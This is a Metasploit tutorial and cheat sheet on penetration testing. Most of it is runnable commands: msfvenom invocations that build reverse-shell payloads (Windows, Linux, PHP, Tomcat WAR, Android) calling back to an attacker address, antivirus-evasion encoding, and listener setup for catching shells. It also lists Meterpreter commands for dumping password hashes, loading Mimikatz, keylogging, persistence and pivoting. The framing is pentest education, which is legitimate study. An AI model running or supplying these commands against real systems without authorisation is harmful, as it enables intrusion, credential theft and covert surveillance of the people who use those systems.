Introduction — What is Metasploit?

Metasploit Framework is the world's most widely used penetration testing platform. Created by H.D. Moore in 2003 and now maintained by Rapid7, it provides a massive library of exploits, payloads, encoders, and auxiliary modules — all from a single unified interface.

What Can Metasploit Do?

Exploit known vulnerabilities — Generate custom payloads — Establish persistent access — Escalate privileges — Pivot through networks — Perform post-exploitation — Scan and enumerate targets — Bypass antivirus detection.

Editions

Metasploit Framework  — Free, open-source, CLI-based
                        All core features available
                        Community maintained on GitHub

Metasploit Pro        — Commercial, GUI-based
                        Automated campaigns, reporting,
                        social engineering tools

Architecture — How Metasploit Works

Directory Structure

/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/     — Exploit code for vulnerabilities
│   ├── auxiliary/    — Scanners, fuzzers, sniffers
│   ├── post/         — Post-exploitation modules
│   ├── payloads/     — Code executed on the target
│   ├── encoders/     — Payload obfuscation
│   └── nops/         — NOP sled generators
├── plugins/          — Extend msfconsole functionality
├── scripts/          — Meterpreter and resource scripts
└── tools/            — Standalone helper utilities

Module Types

Exploits — Code that takes advantage of a vulnerability to execute a payload on the target system.

Auxiliary — Modules that perform scanning, enumeration, fuzzing, or brute forcing without delivering a payload.

Post — Modules that run after successful exploitation — privilege escalation, credential harvesting, pivoting.

Payloads — The code that runs on the target after exploitation — shells, Meterpreter sessions, command execution.

Encoders — Transform payloads to evade antivirus and IDS signatures.

Nops — Generate NOP (No Operation) sleds used in some buffer overflow exploits.

Payload Types

Singles    — Self-contained payload — everything in one
             small piece of shellcode
             Example: windows/shell_bind_tcp

Stagers    — Small payload that sets up a connection channel
             then downloads the full stage
             Identified by /
             Example: windows/meterpreter/reverse_tcp
                      ↑ stager          ↑ stage

Stages     — The full-featured payload delivered by a stager
             Meterpreter, shell, VNC, etc.

Connection Types

Reverse connection  — Target connects BACK to your machine
(reverse_tcp)         Bypasses most firewalls — preferred

Bind connection     — Payload opens a port on the target
(bind_tcp)            You connect TO the target
                      Blocked by most firewalls

Reverse HTTPS       — Reverse connection over port 443
(reverse_https)       Blends in with normal web traffic

Reverse HTTP        — Reverse connection over port 80
(reverse_http)        Easier to bypass egress filtering

Payload Generation — msfvenom

What is msfvenom?

msfvenom is the standalone payload generator — it creates malicious executables, scripts, and shellcode that connect back to your Metasploit listener. It replaces the older msfpayload and msfencode tools.

Basic Syntax

msfvenom -p [payload] [options] -f [format] -o [output file]

Windows Payloads

# Windows EXE — 32-bit Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f exe -o shell.exe

# Windows EXE — 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f exe -o shell64.exe

# Windows DLL
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f dll -o shell.dll

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f psh -o shell.ps1

# Windows Service EXE (for service exploits)
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f exe-service -o service_shell.exe

Linux Payloads

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -f elf -o shell.elf

chmod +x shell.elf

# Linux bind shell (no callback needed)
msfvenom -p linux/x64/shell_bind_tcp \
         LPORT=4444 \
         -f elf -o bind_shell.elf

Encoding — Bypass Antivirus

# List all encoders
msfvenom --list encoders

# Encode with shikata_ga_nai (x86 only — most common)
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -e x86/shikata_ga_nai \
         -i 5 \          — 5 encoding iterations
         -f exe -o encoded_shell.exe

# x64 encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.5 LPORT=4444 \
         -e x64/xor_dynamic \
         -i 3 \
         -f exe -o shell64_encoded.exe

# Note: Basic encoding alone rarely bypasses modern AV
# Use additional techniques: custom packers, obfuscation,
# process injection, or commercial tools

Multi/Handler — Catching Shells

What is Multi/Handler?

Multi/Handler is the listener module — it waits for incoming connections from your payloads. Every payload you generate with msfvenom needs a matching handler to catch the connection.

Setting Up a Handler

msf6 > use exploit/multi/handler

# Set payload to MATCH your msfvenom payload exactly
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set your IP and port
msf6 > set LHOST 10.10.10.5
msf6 > set LPORT 4444

# Start the listener
msf6 > run

# Or run as a background job (keeps listening after first session)
msf6 > run -j

Handling Multiple Sessions

# Keep listener alive after getting a session
set ExitOnSession false
run -j

# Now handler stays open — catches multiple incoming connections
# Each connection becomes a new session

sessions -l          — List all sessions
sessions -i 1        — Interact with session 1
sessions -i 2        — Interact with session 2

Common Handler Payloads

# Windows
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_https

# Linux
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# PHP
set PAYLOAD php/meterpreter/reverse_tcp

# Generic catch-all for simple reverse shells
set PAYLOAD generic/shell_reverse_tcp

Staged vs Stageless Handler

Staged payload:     windows/meterpreter/reverse_tcp
                    — Small stager connects first
                    — Downloads full Meterpreter stage
                    — Handler MUST use multi/handler

Stageless payload:  windows/meterpreter_reverse_tcp
                    (underscore, not slash between meterpreter and reverse)
                    — Full payload in one piece
                    — Can be caught by netcat:
                      nc -lvnp 4444

search [term]        — Find modules
use [module]         — Load module
info                 — Module details
show options         — Required options
show payloads        — Compatible payloads
set [OPT] [val]      — Set option
setg [OPT] [val]     — Set globally
run / exploit        — Execute module
run -j               — Run as background job
check                — Check if vulnerable
back                 — Unload module
sessions -l          — List sessions
sessions -i [N]      — Interact with session N
sessions -k [N]      — Kill session N
jobs                 — List running jobs

Meterpreter Core Commands

sysinfo              — System information
getuid               — Current user
getsystem            — Attempt privilege escalation
getprivs             — List privileges
ps                   — Running processes
migrate [PID]        — Migrate to process
hashdump             — Dump password hashes
load kiwi            — Load Mimikatz
creds_all            — All credentials
shell                — System shell
background           — Background the session
download [file]      — Download file
upload [file] [dst]  — Upload file
screenshot           — Desktop screenshot
keyscan_start        — Start keylogger
keyscan_dump         — Dump keystrokes
portfwd add          — Port forwarding
route add            — Add pivot route

msfvenom Quick Reference

# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=IP LPORT=4444 -f raw -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
         LHOST=IP LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp \
         LHOST=IP LPORT=4444 -o payload.apk

Handler Setup

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [your IP]
set LPORT 4444
set ExitOnSession false
run -j

Full Exploitation Checklist

 Recon — nmap scan, service versions, OS fingerprint
 Search for exploits — searchsploit, Metasploit search
 Select exploit — check rank and targets
 Select payload — match architecture and OS
 Set all required options — RHOSTS, LHOST, LPORT
 Run check first if available
 Execute exploit
 Verify access — getuid, sysinfo
 Migrate to stable process
 Escalate privileges — getsystem
 Dump credentials — hashdump, load kiwi
 Establish persistence if needed
 Pivot to internal network if needed
 Document everything
